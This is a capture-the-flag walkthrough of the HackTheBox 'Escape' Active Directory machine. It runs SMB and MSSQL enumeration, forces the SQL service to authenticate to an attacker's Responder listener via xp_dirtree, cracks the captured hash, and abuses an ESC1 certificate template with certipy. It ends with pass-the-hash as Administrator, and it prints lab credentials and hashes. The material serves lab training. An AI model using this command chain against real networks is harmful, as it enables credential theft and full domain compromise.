

## About

Escape is a **Medium** difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.


## Nmap scan

Starting with a full `nmap` scan to understand the target
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49681/tcp open  unknown
49682/tcp open  unknown
49702/tcp open  unknown
49712/tcp open  unknown
49732/tcp open  unknown
```

## SMB

Since the About mentioned that the machine have a accessible pdf lets give it a try
![](pics/Pasted%20image%2020260826182936.png)
After trying to open every share we found it.
```bash
smbclient //10.129.228.253/Public -N  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```

Opening the file we get this creds
![](pics/Pasted%20image%2020260826183053.png)

## Accessing the mssql 

Login via the creds `mssqlclient`:
```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253
```
### Extra enumeration
Spend time enumerating the `DBs, Users, Links, Impersonate`:
#### DBs

command
```
SELECT name FROM sys.databases;
```

```
SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1  
```

#### tempdb

```
SELECT name, type_desc FROM sys.all_objects WHERE is_ms_shipped = 0;
```

tables
```
name        type_desc    
---------   ----------   
#A4C4CDDB   USER_TABLE
```


#### model
no access
#### msdb

tables
```
table_name                          
---------------------------------   
dm_hadr_automatic_seeding_history   <- nothing
backupmediaset                      <- nothign
backupmediafamily                   <-nothign
backupset                           no
backupfile                          
restorehistory                      
restorefile                         
restorefilegroup                    
logmarkhistory                      
suspect_pages
```

#### master

```
table_name         
----------------   
spt_fallback_db   <- empty
spt_fallback_dev   <- empty
spt_fallback_usg   <- empty
spt_monitor <- filled with monitor data
```
#### Users

```
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
guest                public     NULL        NULL        guest           b'2         '   b'00'   
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
sys                  public     NULL        NULL        NULL            b'4         '    NULL 
```

#### Owner

```
SQL (PublicUser  guest@master)> enum_owner
Database   Owner   
--------   -----   
master     sa      
tempdb     sa      
model      sa      
msdb       sa
```

#### Links

```
RV_NAME     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
----------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC\SQLMOCK   SQLNCLI            SQL Server    DC\SQLMOCK       NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------ 
```
#### impersonate
Nothing
```
SQL (PublicUser  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------  
```

#### Logins

```
SQL (PublicUser  guest@master)> enum_logins
name         type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
----------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa           SQL_LOGIN             0          1               0             0            0              0           0           0           0   
PublicUser   SQL_LOGIN             0          0               0             0            0              0           0           0  
```

#### exec rights

```
SQL (PublicUser  guest@master)> xp_cmdshell whoami
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```


## Getting the shell

As the HTB suggest I can force the mssql service to authenticate to my controlled server:

1- Make responder listen via this command
```
sudo responder -I tun0
```

2- make the mssql access our server:

Using the command `xp_dirtree`
```
xp_dirtree \\10.10.14.82\shared
```

3- capture the hash
```
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:15561e623d8288a2:7ED318FA6D79D39C15295189AA23BB62:01010000000000008081B6F32135DD0153BF953CE4BDFB64000000000200080051004A004200350001001E00570049004E002D003400340051004100540035005700550033004E004B0004003400570049004E002D003400340051004100540035005700550033004E004B002E0051004A00420035002E004C004F00430041004C000300140051004A00420035002E004C004F00430041004C000500140051004A00420035002E004C004F00430041004C00070008008081B6F32135DD0106000400020000000800300030000000000000000000000000300000EB3D905434CF94691EE132502972A1737E12B91C3A261FF0731DB0709BE665EF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000
```

4- crack it
Using hashcat
```
hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
```

Show password
```
hashcat --show sql_svc_hash.txt

user = SQL_SVC::sequel
pass = REGGIE1234ronnie
```

5- Using Evil-Win-Rm to finally get the shell
```
evil-winrm -i 10.129.228.253 -u SQL_SVC -p REGGIE1234ronnie
```

```
C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

## enumerating the machine

Users found:
![](pics/Pasted%20image%2020260826184038.png)

Now taking a look at the mssql log file:
![](pics/Pasted%20image%2020260826184112.png)

Download it
```
download ERRORLOG.BAK /home/kali/Desktop/HTB/escape/loot/sql_logs.txt
```

Seems like cooper entered the password as user:
```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]


2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

## Flag 1

Using the creds:
```
user = Ryan.Cooper
pass = NuclearMosquito3
```
command
```
evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```

![](pics/Pasted%20image%2020260826184319.png)


## Using certipy to get root

Looking for a template vulnerable to ESC1:
```
certipy find -u "Ryan.Cooper" -p "NuclearMosquito3" -dc-ip 10.129.228.253 -vulnerable
```


```
cat 20260826081517_Certipy.txt
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```


## req a cert in the name of admin
```
certipy req -u "Ryan.Cooper@sequel.htb" -p "NuclearMosquito3" -dc-ip 10.129.228.253 -target 10.129.228.253 -ca sequel-DC-CA -template 'UserAuthentication' -upn 'administrator@sequel.htb'
```

verify
```
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem openssl x509 -in administrator.pem -text -noout
```
Look if the cert is indeed with the admin name.

## auth to get the hash

Command
```
certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

![](pics/Pasted%20image%2020260826153405.png)

sync time problem
```bash
sudo timedatectl set-ntp off // turn off auto sync
sudo rdate -n 10.129.228.253 // sync with DC
```
### Try again
![](pics/Pasted%20image%2020260826153548.png)

We got it!!

## Flag 2

Using Pass-the-Hash
```
evil-winrm -i 10.129.228.253 -u administrator@sequel.htb -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```
We get the flag
![](pics/Pasted%20image%2020260826154319.png)
